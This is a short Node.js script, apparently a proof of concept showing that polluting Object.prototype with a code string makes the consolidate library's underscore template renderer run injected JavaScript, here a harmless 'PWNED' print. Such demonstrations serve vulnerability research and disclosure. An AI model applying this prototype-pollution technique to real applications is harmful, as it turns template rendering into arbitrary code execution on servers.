var cons = require('consolidate');

Object.prototype.aaa = 'console.log("PWNED")';
// Object.prototype.cache = true;

cons.underscore('views/underscore.template.html', { name: 'tobi' })
  .then(function (html) {
    console.log(html);
  })
  .catch(function (err) {
    throw err;
  });
